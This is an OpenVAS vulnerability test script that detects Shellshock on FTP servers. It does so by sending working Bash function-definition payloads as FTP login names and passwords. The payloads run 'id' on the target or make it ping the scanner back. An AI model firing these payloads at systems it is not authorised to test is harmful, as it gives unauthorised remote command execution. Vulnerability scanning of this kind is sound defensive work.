###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_bash_shellshock_pure-ftpd_remote_cmd_exec_vuln.nasl 13994 2019-03-05 12:23:37Z cfischer $
#
# GNU Bash Environment Variable Handling Shell Remote Command Execution Vulnerability (FTP Check)
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (C) 2014 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.105094");
  script_version("$Revision: 13994 $");
  script_cve_id("CVE-2014-6271", "CVE-2014-6278");
  script_bugtraq_id(70103);
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"last_modification", value:"$Date: 2019-03-05 13:23:37 +0100 (Tue, 05 Mar 2019) $");
  script_tag(name:"creation_date", value:"2014-09-30 11:47:16 +0530 (Tue, 30 Sep 2014)");

  script_name("GNU Bash Environment Variable Handling Shell Remote Command Execution Vulnerability (FTP Check)");

  script_tag(name:"summary", value:"This host is installed with GNU Bash Shell
  and is prone to remote command execution vulnerability.");

  script_tag(name:"vuldetect", value:"Send a FTP login request and check remote command execution.");

  script_tag(name:"insight", value:"GNU bash contains a flaw that is triggered when evaluating
  environment variables passed from another environment. After processing a function definition,
  bash continues to process trailing strings.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote or local attackers to
  inject  shell commands, allowing local privilege escalation or remote command execution depending
  on the application vector.");

  script_tag(name:"affected", value:"GNU Bash through 4.3");

  script_tag(name:"solution", value:"Apply the patch or upgrade to latest version.");

  script_xref(name:"URL", value:"https://gist.github.com/jedisct1/88c62ee34e6fa92c31dc");
  script_xref(name:"URL", value:"https://access.redhat.com/solutions/1207723");
  script_xref(name:"URL", value:"https://bugzilla.redhat.com/show_bug.cgi?id=1141597");
  script_xref(name:"URL", value:"https://blogs.akamai.com/2014/09/environment-bashing.html");
  script_xref(name:"URL", value:"https://community.qualys.com/blogs/securitylabs/2014/09/24/");
  script_xref(name:"URL", value:"http://www.gnu.org/software/bash/");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2014 Greenbone Networks GmbH");
  script_family("FTP");
  script_dependencies("ftpserver_detect_type_nd_version.nasl");
  script_require_ports("Services/ftp", 21);
  script_mandatory_keys("ftp/banner/available");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("ftp_func.inc");
include("misc_func.inc");

id_users = make_list( '() { :; }; export PATH=/bin:/usr/bin; echo; echo; id;',
                      '() { _; } >_[$($())] {  export PATH=/bin:/usr/bin; echo; echo; id;; }' );

port = get_ftp_port( default:21 );

foreach id_user ( id_users )
{
  id_pass = id_user;

  soc = ftp_open_socket( port:port );
  if( ! soc )
    break;

  send(socket:soc, data:'USER ' + id_user + '\r\n');
  recv = recv( socket:soc, length:1024 );

  send(socket:soc, data:'PASS ' + id_pass + '\r\n');
  recv += recv( socket:soc, length:1024 );

  ftp_close( socket:soc );

  if( recv =~ "uid=[0-9]+.*gid=[0-9]+.*" )
  {
    VULN = TRUE;
    break;
  }
}

if( ! VULN )
{
  vtstrings = get_vt_strings();
  str = vtstrings["ping_string"];
  pattern = hexstr( str );
  p_users = make_list(
                      '() { :; }; export PATH=/bin:/usr/bin; ping -p ' + pattern + ' -c3 ' + this_host(),
                      '{ _; } >_[$($())] { export PATH=/bin:/usr/bin; ping -p ' + pattern + ' -c3 ' + this_host() + '; }'
                     );

  foreach user ( p_users )
  {
    soc = ftp_open_socket( port:port );
    if( ! soc )
      break;

    pass = user;

    send(socket:soc, data:'USER ' + user + '\r\n');
    recv = recv( socket:soc, length:1024 );
    send(socket:soc, data:'PASS ' + pass + '\r\n');

    res = send_capture( socket:soc,
                        data:"",
                        pcap_filter:string( "icmp and icmp[0] = 8 and dst host ", this_host(), " and src host ", get_host_ip() )
                       );
    ftp_close( socket:soc );

    if( ! res  )
      continue;

    data = get_icmp_element( icmp:res, element:"data" );

    if( str >< data)
    {
      VULN = TRUE;
      break;
    }
  }
}

if( VULN )
{
  security_message( port:port );
  exit( 0 );
}

exit( 99 );